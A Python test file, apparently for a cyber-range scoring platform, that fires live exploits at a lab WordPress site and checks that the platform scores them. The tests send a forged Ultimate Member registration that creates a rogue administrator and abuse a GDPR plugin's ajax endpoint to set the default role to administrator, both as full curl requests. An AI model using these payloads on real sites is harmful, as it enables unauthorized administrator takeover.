import re
import time
import uuid
from datetime import datetime, timedelta, timezone

import requests

from conftest import PLATFORM_URL, TARGET_PUBLIC
from range import ATTACKER, run

CORP = "corp"
CORP_DB = "corp-db"
CORP_HOST = "Host: corp.com"
ROGUE_KEY = "wp_c%C3%A0pabilities%5Badministrator%5D=1"
NONCE = re.compile(r'name="_wpnonce" value="([^"]+)"')
AJAX_NONCE = re.compile(r'"ajaxSecurity":"([a-f0-9]+)"')


def _admin_ids():
    out = run(CORP_DB, [
        "mysql", "-uwordpress", "-pwordpress", "wordpress", "-N", "-e",
        "SELECT user_id FROM wp_usermeta WHERE meta_key='wp_capabilities' "
        "AND meta_value LIKE '%administrator%';",
    ]).stdout
    return {int(x) for x in out.split()}


def _register_nonce():
    page = run(ATTACKER, [
        "curl", "-s", "-H", CORP_HOST, "--max-time", "20",
        f"{TARGET_PUBLIC}/register/",
    ]).stdout
    found = NONCE.search(page)
    assert found, "no _wpnonce on the live UM register form; is corp-wp up?"
    return found.group(1)


def _submit(nonce, login):
    return run(ATTACKER, [
        "curl", "-s", "-o", "/dev/null", "-w", "%{http_code}", "--max-time", "20",
        "-H", CORP_HOST,
        "--data", "form_id=5",
        "--data", "um_request=",
        "--data", f"_wpnonce={nonce}",
        "--data", "_wp_http_referer=/register/",
        "--data", f"user_login-5={login}",
        "--data", "first_name-5=North",
        "--data", "last_name-5=Wind",
        "--data", f"user_email-5={login}@example.com",
        "--data", "user_password-5=Str0ng-Pass-9271",
        "--data", "confirm_user_password-5=Str0ng-Pass-9271",
        "--data", ROGUE_KEY,
        f"{TARGET_PUBLIC}/register/",
    ]).stdout.strip()


def _delete(uid):
    run(CORP, ["wp", "--allow-root", "user", "delete", str(uid), "--yes", "--network"])


def _option(name):
    return run(CORP_DB, [
        "mysql", "-uwordpress", "-pwordpress", "wordpress", "-N", "-e",
        f"SELECT option_value FROM wp_options WHERE option_name='{name}';",
    ]).stdout.strip()


def _set_option(name, value):
    run(CORP_DB, [
        "mysql", "-uwordpress", "-pwordpress", "wordpress", "-e",
        f"UPDATE wp_options SET option_value='{value}' WHERE option_name='{name}';",
    ])


def _ajax_nonce():
    page = run(ATTACKER, [
        "curl", "-s", "-H", CORP_HOST, "--max-time", "20", f"{TARGET_PUBLIC}/",
    ]).stdout
    found = AJAX_NONCE.search(page)
    assert found, "no wpgdprcData.ajaxSecurity on the live corp.com homepage; is corp-wp up?"
    return found.group(1)


def _flip(security, option, value):
    return run(ATTACKER, [
        "curl", "-s", "-o", "/dev/null", "-w", "%{http_code}", "--max-time", "20",
        "-H", CORP_HOST,
        "--data", f'data={{"type":"save_setting","append":false,"option":"{option}","value":"{value}"}}',
        f"{TARGET_PUBLIC}/wp-admin/admin-ajax.php?action=wpgdprc_process_action&security={security}",
    ]).stdout.strip()


def test_a_live_rogue_admin_registration_is_scored_from_the_targets_own_binlog(stack_is_up):
    baseline = _admin_ids()
    created = session_id = None
    try:
        session_id = requests.post(
            f"{PLATFORM_URL}/api/sessions/", json={"scenario": "corp"}, timeout=60
        ).json()["id"]

        time.sleep(2)
        fired_at = datetime.now(timezone.utc)
        code = _submit(_register_nonce(), f"rogue_{uuid.uuid4().hex[:8]}")
        assert code == "302", f"the rogue-admin registration did not complete, got {code!r}"
        done_at = datetime.now(timezone.utc)

        after = _admin_ids()
        created = after - baseline
        assert created and all(uid > 1 for uid in created), (
            f"no non-baseline administrator was committed; admins {sorted(after)}"
        )

        window = {
            "case_id": f"corp-rogue-admin-{uuid.uuid4().hex[:8]}",
            "name": "corp-rogue-admin", "malicious": True, "correlation": "marker",
            "started_at": (fired_at - timedelta(seconds=3)).isoformat(),
            "ended_at": (done_at + timedelta(seconds=3)).isoformat(),
        }
        recorded = requests.post(
            f"{PLATFORM_URL}/api/sessions/{session_id}/cases/", json=window, timeout=60
        )
        assert recorded.status_code == 201, recorded.text

        observed = requests.post(
            f"{PLATFORM_URL}/api/sessions/{session_id}/objectives/", timeout=90
        ).json()
        assert observed["total"] == 3

        objectives = requests.get(
            f"{PLATFORM_URL}/api/sessions/{session_id}/objectives/", timeout=60
        ).json()
        assert {o["key"] for o in objectives} == {"corp-rogue-admin"}, (
            f"the binlog read did not credit the rogue admin; got {objectives}"
        )

        score = requests.get(
            f"{PLATFORM_URL}/api/sessions/{session_id}/score/", timeout=60
        ).json()
        assert score["objectives"]["objectives"] >= 1
        assert "corp-rogue-admin" in {b["key"] for b in score["breaches"]}
    finally:
        for uid in sorted(created or []):
            _delete(uid)
        assert _admin_ids() == baseline, (
            f"left corp-db dirty: admins now {sorted(_admin_ids())}, baseline {sorted(baseline)}"
        )
        if session_id is not None:
            requests.post(
                f"{PLATFORM_URL}/api/sessions/{session_id}/close/", json={}, timeout=120
            )


def test_a_live_option_flip_is_scored_from_the_targets_own_binlog(stack_is_up):
    session_id = None
    try:
        session_id = requests.post(
            f"{PLATFORM_URL}/api/sessions/", json={"scenario": "corp"}, timeout=60
        ).json()["id"]

        time.sleep(2)
        fired_at = datetime.now(timezone.utc)
        nonce = _ajax_nonce()
        assert _flip(nonce, "users_can_register", "1") == "200"
        assert _flip(nonce, "default_role", "administrator") == "200"
        assert _option("users_can_register") == "1"
        done_at = datetime.now(timezone.utc)

        window = {
            "case_id": f"corp-self-registration-{uuid.uuid4().hex[:8]}",
            "name": "corp-self-registration", "malicious": True, "correlation": "marker",
            "started_at": (fired_at - timedelta(seconds=3)).isoformat(),
            "ended_at": (done_at + timedelta(seconds=3)).isoformat(),
        }
        recorded = requests.post(
            f"{PLATFORM_URL}/api/sessions/{session_id}/cases/", json=window, timeout=60
        )
        assert recorded.status_code == 201, recorded.text

        requests.post(f"{PLATFORM_URL}/api/sessions/{session_id}/objectives/", timeout=90)
        objectives = requests.get(
            f"{PLATFORM_URL}/api/sessions/{session_id}/objectives/", timeout=60
        ).json()
        assert {o["key"] for o in objectives} == {"corp-self-registration"}, (
            f"the binlog read did not credit the option flip; got {objectives}"
        )
        score = requests.get(
            f"{PLATFORM_URL}/api/sessions/{session_id}/score/", timeout=60
        ).json()
        assert "corp-self-registration" in {b["key"] for b in score["breaches"]}
    finally:
        _set_option("users_can_register", "0")
        _set_option("default_role", "subscriber")
        assert _option("users_can_register") == "0"
        assert _option("default_role") == "subscriber"
        if session_id is not None:
            requests.post(
                f"{PLATFORM_URL}/api/sessions/{session_id}/close/", json={}, timeout=120
            )
